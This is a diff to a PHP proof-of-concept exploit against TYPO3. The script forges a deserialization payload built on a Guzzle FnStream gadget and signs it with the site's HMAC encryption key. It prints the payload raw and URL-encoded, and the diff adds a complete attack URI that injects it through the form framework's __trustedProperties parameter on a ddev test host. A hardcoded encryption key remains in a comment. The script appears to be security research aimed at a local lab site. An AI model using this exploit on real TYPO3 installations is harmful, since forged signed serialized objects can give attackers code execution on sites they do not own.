@@ -41,42 +41,10 @@ namespace TYPO3\CMS\IndexedSearch\Controller
     }
 }
 
-namespace TYPO3\CMS\Core\Utility {
-    class GeneralUtility {
-        // same as hash_hmac('sha1', $string, $encryptionKey);
-        public static function hmac($input, $additionalSecret = '')
-        {
-            // $encryptionKey = $GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey'];
-            $encryptionKey = 'f30230987c323b8f81a0ab9fe5b690fd0ba3fb8161f4027221a6b6aa4c50ce629049b7d30c3681f3a9e2031f1dc401e6';
-
-            $hashAlgorithm = 'sha1';
-            $hashBlocksize = 64;
-            $secret = $encryptionKey . $additionalSecret;
-            if (extension_loaded('hash') && function_exists('hash_hmac') && function_exists('hash_algos') && in_array($hashAlgorithm, hash_algos())) {
-                $hmac = hash_hmac($hashAlgorithm, $input, $secret);
-            } else {
-                // Outer padding
-                $opad = str_repeat(chr(92), $hashBlocksize);
-                // Inner padding
-                $ipad = str_repeat(chr(54), $hashBlocksize);
-                if (strlen($secret) > $hashBlocksize) {
-                    // Keys longer than block size are shorten
-                    $key = str_pad(pack('H*', call_user_func($hashAlgorithm, $secret)), $hashBlocksize, "\0");
-                } else {
-                    // Keys shorter than block size are zero-padded
-                    $key = str_pad($secret, $hashBlocksize, "\0");
-                }
-                $hmac = call_user_func($hashAlgorithm, ($key ^ $opad) . pack('H*', call_user_func(
-                        $hashAlgorithm,
-                        ($key ^ $ipad) . $input
-                    )));
-            }
-            return $hmac;
-        }
-    }
-}
-
 namespace {
+    $encryptionKey = readline('Encryption Key: ');
+    // $encryptionKey = 'f30230987c323b8f81a0ab9fe5b690fd0ba3fb8161f4027221a6b6aa4c50ce629049b7d30c3681f3a9e2031f1dc401e6';
+
     /*
      * openssl passwd -1 -salt 123456 password
      * => $1$123456$qqQvjw0PqIk7otmzNsUIN0
@@ -111,19 +79,24 @@ namespace {
     $caller = new \GuzzleHttp\Psr7\FnStream([$trigger, 'initialize']);
 
     echo 'Plain "x"' . PHP_EOL;
-    echo \TYPO3\CMS\Core\Utility\GeneralUtility::hmac('x') . PHP_EOL;
+    echo hash_hmac('sha1', 'x', $encryptionKey) . PHP_EOL;
 
     echo '---' . PHP_EOL;
 
     echo 'Real payload (signed)' . PHP_EOL;
     $attack = serialize($caller);
-    $signedAttack = $attack . \TYPO3\CMS\Core\Utility\GeneralUtility::hmac($attack);
+    $signedAttack = $attack . hash_hmac('sha1', $attack, $encryptionKey);
     print_r($signedAttack  . PHP_EOL);
 
     echo '---' . PHP_EOL;
 
     echo 'Real payload (signed, encoded)' . PHP_EOL;
     print_r(rawurlencode($signedAttack) . PHP_EOL);
+
+    echo '---' . PHP_EOL;
+
+    echo 'Possible URI' . PHP_EOL;
+    print_r('http://typo3v9-hack.ddev.site/index.php?id=38&no_cache=1&tx_form_formframework[__trustedProperties]=' . rawurlencode($signedAttack) . PHP_EOL);
 
     echo '---' . PHP_EOL;
 }
